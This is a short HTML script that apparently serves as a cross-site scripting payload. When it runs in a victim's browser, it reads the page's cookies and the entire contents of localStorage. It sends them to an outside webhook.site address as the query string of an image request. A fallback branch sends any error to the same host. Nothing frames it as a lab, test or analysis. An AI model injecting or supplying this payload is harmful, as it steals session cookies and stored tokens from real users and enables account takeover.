<script>
try {
  // send cookie and localStorage to webhook via image GET
  new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?c='
    + encodeURIComponent(document.cookie)
    + '&ls=' + encodeURIComponent(JSON.stringify(localStorage));
} catch (e) {
  new Image().src = 'https://webhook.site/2afc4f07-84c3-4d80-a4a0-78baf2125845/?err='
    + encodeURIComponent(String(e));
}
</script>
